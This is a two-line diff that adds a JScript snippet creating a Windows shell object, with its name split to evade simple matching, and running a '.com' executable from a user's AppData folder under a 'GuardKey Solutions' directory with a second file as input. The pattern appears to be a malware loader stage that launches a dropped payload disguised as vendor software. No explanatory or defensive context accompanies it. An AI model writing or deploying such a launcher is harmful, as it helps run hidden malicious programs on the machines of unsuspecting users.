@@ -1,0 +1,2 @@
+HermesKey = new ActiveXObject("Wscript."+"Shell")
+HermesKey.Exec("\"C:\\Users\\Mauricio\\AppData\\Local\\GuardKey Solutions\\HermesKey.com\" \"C:\\Users\\Mauricio\\AppData\\Local\\GuardKey Solutions\\Z\"")
